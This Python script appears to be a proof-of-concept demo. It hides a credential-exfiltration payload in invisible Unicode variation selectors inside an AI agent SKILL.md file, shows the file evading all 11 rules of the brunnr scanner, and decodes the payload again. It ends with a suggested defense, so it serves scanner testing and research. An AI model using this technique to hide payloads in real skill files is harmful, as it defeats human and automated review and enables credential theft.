#!/usr/bin/env python3
"""Glassworm Bypass: Full Demo

Runs the complete exploit pipeline in sequence:
  1. Encode a credential-exfiltration payload into invisible Unicode
  2. Embed it in a realistic SKILL.md that passes visual inspection
  3. Run brunnr's full 11-rule scanner against the poisoned file
  4. Extract the hidden payload to confirm the roundtrip

Usage:
    python exploits/glassworm-bypass/demo.py
    python exploits/glassworm-bypass/demo.py "your custom payload here"
"""

from __future__ import annotations

import sys
import time
from pathlib import Path

# Ensure brunnr is importable from the project root.
sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from encode_payload import encode, build_skill_md, DEFAULT_PAYLOAD  # noqa: E402
from decode_payload import decode  # noqa: E402
from brunnr.scanner import scan_skill_md  # noqa: E402
from brunnr.scanner.context import ScanContext  # noqa: E402
from brunnr.scanner.rules import DEFAULT_RULES  # noqa: E402


# --- Colors (ANSI) ---

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
DIM = "\033[2m"
BOLD = "\033[1m"
RESET = "\033[0m"


def header(title: str) -> None:
    print()
    print(f"{CYAN}{'━' * 62}{RESET}")
    print(f"{CYAN}  {BOLD}{title}{RESET}")
    print(f"{CYAN}{'━' * 62}{RESET}")
    print()


def step(n: int, label: str) -> None:
    print(f"  {YELLOW}[{n}]{RESET} {BOLD}{label}{RESET}")


def ok(msg: str) -> None:
    print(f"      {GREEN}✓{RESET} {msg}")


def fail(msg: str) -> None:
    print(f"      {RED}✗{RESET} {msg}")


def dim(msg: str) -> None:
    print(f"      {DIM}{msg}{RESET}")


def pause(seconds: float = 0.4) -> None:
    """Brief pause for visual readability in terminal."""
    time.sleep(seconds)


def main() -> None:
    payload = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_PAYLOAD
    skill_path = Path(__file__).parent / "SKILL.md"

    # ================================================================
    # STEP 1: ENCODE
    # ================================================================
    header("GLASSWORM BYPASS: VARIATION SELECTOR STEGANOGRAPHY")

    step(1, "Encode payload into invisible Unicode")
    print()

    encoded = encode(payload)
    skill_content = build_skill_md(payload)
    skill_path.write_text(skill_content, encoding="utf-8")

    # Truncate long payloads for display
    display_payload = payload if len(payload) <= 60 else payload[:57] + "..."
    dim(f"Payload:  {display_payload}")
    dim(f"Bytes:    {len(payload.encode('utf-8'))}")
    dim(f"VS chars: {len(encoded)}")
    print()

    # Show the encoding mapping for first few bytes
    payload_bytes = payload.encode("utf-8")
    dim("Encoding sample (first 8 bytes):")
    for i, byte in enumerate(payload_bytes[:8]):
        if byte < 16:
            cp = 0xFE00 + byte
            plane = "BMP"
        else:
            cp = 0xE0100 + byte - 16
            plane = "SMP"
        char_repr = chr(byte) if 32 <= byte < 127 else f"0x{byte:02x}"
        dim(f"  '{char_repr}' (byte {byte:>3d}) → U+{cp:05X} ({plane})")

    print()
    ok(f"Generated SKILL.md ({skill_path.stat().st_size} bytes)")
    ok(f"Payload produces zero visible output in all renderers")
    pause()

    # ================================================================
    # STEP 2: INSPECT (what the file looks like to a reviewer)
    # ================================================================
    print()
    step(2, "What a reviewer sees")
    print()

    lines = skill_content.split("\n")
    # Show the line containing the payload (it looks clean)
    payload_line_idx = None
    for i, line in enumerate(lines):
        if any(0xFE00 <= ord(c) <= 0xFE0F or 0xE0100 <= ord(c) <= 0xE01EF for c in line):
            payload_line_idx = i
            break

    if payload_line_idx is not None:
        # Show context around the payload line
        start = max(0, payload_line_idx - 2)
        end = min(len(lines), payload_line_idx + 3)
        for i in range(start, end):
            visible = "".join(
                c for c in lines[i]
                if not (0xFE00 <= ord(c) <= 0xFE0F or 0xE0100 <= ord(c) <= 0xE01EF)
            )
            prefix = f"  {RED}→{RESET}" if i == payload_line_idx else "   "
            print(f"    {DIM}{i + 1:>3d}{RESET}{prefix} {visible}")

        print()
        ok(f"Line {payload_line_idx + 1} contains 72 invisible characters after the period")
        ok("GitHub diff, VS Code, cat, less: all show nothing")
    pause()

    # ================================================================
    # STEP 3: SCAN
    # ================================================================
    print()
    step(3, "Run brunnr scanner (all 11 rules)")
    print()

    result = scan_skill_md(skill_content)
    ctx = ScanContext.from_content(skill_content)

    for rule_cls in DEFAULT_RULES:
        rule = rule_cls()
        findings = rule.scan(ctx)
        if not findings:
            print(f"      {GREEN}✓{RESET} {rule.name}")
        else:
            print(f"      {RED}✗{RESET} {rule.name}: {len(findings)} finding(s)")

    print()
    if result.clean:
        ok(f"{BOLD}VERDICT: CLEAN{RESET}{GREEN}. 0 findings, 0 flags, 0 blocks{RESET}")
    else:
        fail(f"VERDICT: DETECTED. {len(result.findings)} finding(s)")
    pause()

    # ================================================================
    # STEP 4: DECODE (what a malicious runtime extracts)
    # ================================================================
    print()
    step(4, "Extract hidden payload")
    print()

    decoded_bytes = decode(skill_content)
    decoded_str = decoded_bytes.decode("utf-8")

    dim("Scanning SKILL.md for variation selectors...")
    dim(f"Found {len(decoded_bytes)} encoded bytes")
    print()
    print(f"      {RED}{BOLD}PAYLOAD: {decoded_str}{RESET}")
    print()

    if decoded_str == payload:
        ok("Perfect roundtrip. Decoded payload matches original")
    else:
        fail("Roundtrip mismatch!")

    # ================================================================
    # SUMMARY
    # ================================================================
    header("SUMMARY")

    visible_bytes = len("".join(
        c for c in skill_content
        if not (0xFE00 <= ord(c) <= 0xFE0F or 0xE0100 <= ord(c) <= 0xE01EF)
    ).encode("utf-8"))
    total_bytes = skill_path.stat().st_size
    overhead = ((total_bytes - visible_bytes) / visible_bytes) * 100

    print(f"  File            {DIM}SKILL.md ({total_bytes} bytes){RESET}")
    print(f"  Visible         {DIM}{visible_bytes} bytes{RESET}")
    print(f"  Hidden payload  {DIM}{len(decoded_bytes)} bytes ({overhead:.1f}% overhead){RESET}")
    print(f"  Scanner result  {GREEN}{BOLD}CLEAN{RESET}")
    print(f"  Rules evaded    {DIM}11 / 11{RESET}")
    print()
    print(f"  Payload:")
    print(f"  {RED}{decoded_str}{RESET}")
    print()
    print(f"  {DIM}Technique:  Glassworm variation selector stego{RESET}")
    print(f"  {DIM}Lineage:    CVE-2021-42574 > Glassworm > this PoC{RESET}")
    print(f"  {DIM}Defense:    Allowlist visible chars, strip at ingestion{RESET}")
    print()


if __name__ == "__main__":
    main()
